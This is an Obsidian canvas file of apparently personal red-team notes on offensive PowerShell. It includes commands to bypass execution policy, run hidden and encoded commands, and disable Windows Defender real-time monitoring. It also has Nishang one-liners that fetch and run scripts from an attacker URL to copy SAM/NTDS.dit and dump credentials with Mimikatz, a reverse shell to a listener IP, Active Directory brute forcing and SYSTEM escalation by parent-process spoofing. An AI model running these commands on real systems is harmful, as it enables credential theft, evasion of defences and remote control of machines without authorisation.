{
	"nodes":[
		{"id":"d0c9ab3b74259fe4","type":"file","file":"NOTES/2. Windows/Powershell/WMI with PowerShell.md","x":8720,"y":2015,"width":1040,"height":3945},
		{"id":"b1e37e138745481b","type":"file","file":"NOTES/2. Windows/Powershell/Powershell_inmemory_file_download_and_execution.md","x":799,"y":1554,"width":901,"height":3526},
		{"id":"c196aa26a38e3181","type":"text","text":"# list commands\n```powershell\nPS>  Get-Command # list all commands\nPS>  Get-Command -Name *Firewall* # list all functions related to modification of word Firewall\n```\n# pipelining\nedirect the results of our pipeline operation to a file using a standard Redirect Operator (>)\n```powershell\nPS>  Get-Process | Sort-Object -Unique | Select-Object ProcessName> uniq_procs.txt\n```\n\n# Export-Csv\n```powershell\n# pipe all of the output to the “Export-Csv and save the results in CSV format\nPS> Get-WmiObject -class win32_operatingsystem | f1 * | Export-Csv C:\\host_info.csv\n```","x":-1988,"y":1960,"width":1013,"height":520},
		{"id":"3876f57f67de56d6","type":"text","text":"# Select-String\n```powershell\nPS> Select-String -Path C:\\users\\user\\Documents\\*.txt -Pattern pass* # search for lines containing the word \"pass\" in text files within a specific directory.\n```\n# Display Full Contents of \"passwords.txt\"\n- Use the \"Get-Content\" cmdlet to display the full contents of the \"passwords.txt\" file.\n```powershell\nPS C:\\> Get-Content C:\\Users\\user\\Documents\\passwords.txt\n```\n","x":-920,"y":2130,"width":800,"height":350},
		{"id":"4418f8dffbe0fe6d","type":"text","text":"# Exploring the Registry\n```powershell\nPS> cd HKLM:\\\nPS HKLM:\\> cd .\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ \nPS HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\> ls\n```","x":-920,"y":1955,"width":681,"height":175},
		{"id":"0cdf5f361b3e586d","type":"text","text":"# abbreviations\nFurthermore, all of the `PowerShell.exe` command line parameters, as well as their arguments, can also be abbreviated, as long as the abbreviations are unique, and additionally, are not required to be case-sensitive either\n```powershell\nPS>  powershell.exe -ep Bypass\nPS>  powershell.exe -ex by\n\nPS>  powershell.exe -enco \nPS>  powershell.exe -ec\n\nPS>  powershell.exe -Wi hi\nPS>  powershell.exe -W h\n```","x":-1388,"y":1500,"width":555,"height":420},
		{"id":"54a8b7fd303aa340","type":"text","text":"# -ExecutionPolicy\nThe PowerShell execution policy determines which scripts if any, we can run and can easily be disabled with the \"Bypass\" or \"Unrestricted\" arguments. \n```powershell\nPS> powershell.exe -ExecutionPolicy Bypass .\\script.psl \nPS> powershell.exe -ExecutionPolicy Unrestricted .\\script.psl\n```\n\n# -WindowStyle\nThe `-WindowStyle` parameter hides the Powershell window when used with the “hidden” argument. \n```powershell\nPS>  powershell.exe -WindowStyle Hidden .\\script.psi\n```\n# -Command\nThe `-Command` parameter is used to specify a Command or Script Block to run. \n```powershell\nPS> powershell.exe -Command Get-Process\nPS> powershell.exe -Command \"& { Get-EventLog –LogName security }\"\n```\n# -EncodedCommand\nThe `-EncodedCommand` parameter is used to execute base64 encoded scripts or commands. \n```powershell\nPS>  powershell.exe -EncodedCommand $encodedCommand\n```\n# -NoProfile\nDon’t load any powershell profiles. Profiles are essentially scripts that run when the powershell executable is launched and can interfere with our operations. \n```powershell\nPS>  powershell.exe -NoProfile .\\script.psl\n```\n# -NoLogo\nSuppresses displaying the PowerShell logo banner when starting a new session. This can be useful when you want a cleaner output without the logo information.\n```powershell\nPS> powershell.exe -NoLogo .\\script.ps1\n```\n# -NonInteractive\nRun PowerShell in a non-interactive mode. In non-interactive mode, PowerShell does not prompt for input and assumes default values for any prompts. This is particularly useful in automation scenarios where user interaction is not desired.\n```powershell\nPS> powershell.exe -NonInteractive .\\script.ps1\n```","x":-1980,"y":320,"width":568,"height":1635},
		{"id":"14f0d1d8b1c60369","type":"text","text":"# Get-Service\n\nRunning \"Get-Service\" without parameters or arguments returns a three-column list of all services.\n```powershell\nPS C:\\> Get-Service\n\n```\n\nDisplaying specific details about services, such as those starting with \"s\" in descending order and sorted by the \"Status\" property.\n\npowershell\n\n```powershell\nPS C:\\> Get-Service \"s*\" | Sort-Object Status -Descending\n```\n\n# Get-Process\n```powershell\n# Running the *Get-Process” cmdlet without any arguments returns basic information\nPS> Get-Process # returns basic information about all proceses\nPS> Get-Process | Format-List * # get all of the information (properties) associated with all of the processes\nPS> Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path,Id # get information about specific processes and paths to their executables\n```\n","x":-1388,"y":820,"width":868,"height":640},
		{"id":"da524f20ae2a1294","type":"text","text":"# Download and execute methods","x":580,"y":1280,"width":320,"height":100,"color":"5"},
		{"id":"f55de88df7037556","type":"text","text":"# Information Gathering and Recon","x":3180,"y":1320,"width":520,"height":80,"color":"5"},
		{"id":"c1130b1432ebce33","type":"link","url":"https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20workshops/DEF%20CON%2025%20-%20Carlos-Perez-Leveraging-Powershell-Lab-Manual.pdf","x":-80,"y":-442,"width":485,"height":620},
		{"id":"36a082361f13553e","type":"text","text":"# /usr/share/windows-resources","x":4960,"y":1280,"width":529,"height":101,"color":"5"},
		{"id":"5aa4f22fdd1b676c","type":"text","text":"# $ nishang\nframework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.\n# Gather info\n```powershell\nPS> iex (New-Object Net.Webclient).DownloadString(\"http://attacker_url/Copy-VSS.psl\"); Copy-Vss # copy SAM database, if run od DC try copy NTDS.dit and content of the SYYSTEM registry hive\n```\n```powershell\nPS> iex (New-Object Net.WebClient).DownloadString('http://attacker/Get-Information.ps1'); Get-Information # get a lot of system information\n```\n```powershell\n# Get-PassHints we can use to dump the saved Password Hints for users on the system\nPS> iex (New-Object Net.WebClient).DownloadString(\"http://attacker/Get-PassHints\"); Get-PassHints \n```\n```powershell\n# dump clear-text credentials (or hashes) from memory\nPS> iex (New-Object Net.WebClient) .Downloadstring(\"http://attacker/Invoke-Mimikatz\"); Invoke-Mimikatz -DumpCreds \n```\n# Bruteforce MSSQL, AD, WEB, FTP \n```powershell\nPS> Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\\temp\\users.txt -PasswordList C:\\temp\\pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose\n```\n# Reverse PowerShell Shell (Netcat)\ntraffic is traversing the wire in cleartext\n```powershell\ncmd> powershell.exe -Command iex (New-Object Net.WebClient).DownloadString('http://<attacker_URL>/Invoke-PowerShellTcp.psl'); Invoke-PowerShellTcp -Reverse -IPAddress <listener_IP> -Port 4444\n```","x":4320,"y":2015,"width":921,"height":905},
		{"id":"0baabecdc3bc14a4","type":"text","text":"https://vulnerablelife.wordpress.com/2020/03/05/powershell-for-red-teams/\n\n\n\n# $ powershell-empire\n# start\n```bash\nsudo powershell-empire server\nsudo powershell-empire client\n```\n","x":6120,"y":2015,"width":1036,"height":312},
		{"id":"6ac24895a506f4cc","type":"text","text":"# Posh-SecMod\n## Invoke-ARPScan\n```powershell\nPS> Invoke-ARPScan -CIDR 192.168.13.1/24\n```\n## Invoke-ReverseDnsLookup\n```powershell\nPS> Invoke-ReverseDnsLookup -CIDR 192.168.13.0/24\n```\n## Resolve-HostRecord\n```powershell\nPS> Get-Help Resolve-HostRecord -Examples\n```\n## Resolve-DNSRecord\n```powershell\nPS> Get-Help Resolve-HostRecord -Examples\n```\n## other useful cmdlets\n```powershell\nPS> Get-commmand -module Posh-SecMod\n\nInvoke-ARPScan\nInvoke-DBSQLite3Query\nInvoke-EnumSRVRecords\nInvoke-PingScan\nInvoke-ReverseDnsLookup\n```\n","x":7180,"y":2015,"width":611,"height":891},
		{"id":"d4ab3509269a1464","type":"text","text":"# PSgetsystem\nPsgetsystem allows us to get SYSTEM privileges via a parent process, which then spawns a child process which effectively inherits the SYSTEM access privileges of the parent.\n\n1. needs to be run as Administrator\n1. elevated privs required, typically *seDebugPrivilege* which administrators have\n\ngreat way to evade application whitelisting solutions by being able to inject ourselves into an already signed or other trusted process.\n```powershell\n# identify SYSTEM processes\nPS> Get-Process -IncludeUserName | Where-Object {$_.UserName -match \"SYSTEM\") |Format-List -Property Username,Name,Id # That should return a list of all SYSTEM-owned processes along with their PIDs and process names.\n\nPS> . .\\psgetsys.ps1\nPS> [MyProcess]::CreateProcessFromParent(<system_pid>,\"<command_to_execute>\")\nPS> [MyProcess]::CreateProcessFromParent(<system_pid>,\"cmd.exe\")\n# confirm this by running a tool like Process Explorer, to see that cmd.exe process has been spawned as a child process of the <system_pid> process and is also SYSTEM.\n```","x":7820,"y":2015,"width":860,"height":623},
		{"id":"d304c6796812f319","type":"text","text":"# POWERSHELL","x":-1104,"y":0,"width":300,"height":80,"color":"5"},
		{"id":"f88b5d3eec7b52b3","type":"text","text":"# Privs elevation","x":8060,"y":1440,"width":380,"height":100,"color":"5"},
		{"id":"7d708770be6d9bd0","type":"text","text":"# POST","x":9115,"y":1480,"width":250,"height":60,"color":"5"},
		{"id":"5484da28341ed70f","type":"text","text":"# disable Real Time Monitoring (Windows Defender)\n```powershell\nSet-MpPreference -DisableRealtimeMonitoring $true\n```","x":-1388,"y":640,"width":793,"height":123},
		{"id":"a32e9b12d3999da8","type":"file","file":"NOTES/2. Windows/Powershell/powersploit.md","x":5309,"y":2015,"width":751,"height":1265},
		{"id":"8574087f79e5cbdc","type":"file","file":"NOTES/2. Windows/Powershell/Powershell_to_disc_file_download.md","x":-80,"y":1554,"width":820,"height":1046},
		{"id":"bdb2197c6890256a","type":"text","text":"# Obfuscation","x":2188,"y":1320,"width":250,"height":60,"color":"5"},
		{"id":"0f1ef0796fbd32b4","type":"text","text":"# Invoke-PSObfuscation\nhttps://github.com/gh0x0st/Invoke-PSObfuscation\n# $ Invoke-Obfuscation\nhttps://github.com/danielbohannon/Invoke-Obfuscation","x":2000,"y":1554,"width":626,"height":269}
	],
	"edges":[
		{"id":"e665cecb2a15323b","fromNode":"d304c6796812f319","fromSide":"bottom","toNode":"54a8b7fd303aa340","toSide":"top"},
		{"id":"71251ae96cb7a16b","fromNode":"da524f20ae2a1294","fromSide":"bottom","toNode":"8574087f79e5cbdc","toSide":"top"},
		{"id":"95b8506a4ab497dc","fromNode":"da524f20ae2a1294","fromSide":"bottom","toNode":"b1e37e138745481b","toSide":"top"},
		{"id":"812f351b0eda1899","fromNode":"bdb2197c6890256a","fromSide":"bottom","toNode":"0f1ef0796fbd32b4","toSide":"top"},
		{"id":"b26ec9d2f5fc1466","fromNode":"36a082361f13553e","fromSide":"bottom","toNode":"5aa4f22fdd1b676c","toSide":"top"},
		{"id":"83e3ff16fc98ddd2","fromNode":"36a082361f13553e","fromSide":"bottom","toNode":"a32e9b12d3999da8","toSide":"top"},
		{"id":"e8ee329a5aa95310","fromNode":"f88b5d3eec7b52b3","fromSide":"bottom","toNode":"d4ab3509269a1464","toSide":"top"},
		{"id":"03f7952848abd200","fromNode":"7d708770be6d9bd0","fromSide":"bottom","toNode":"d0c9ab3b74259fe4","toSide":"top"}
	]
}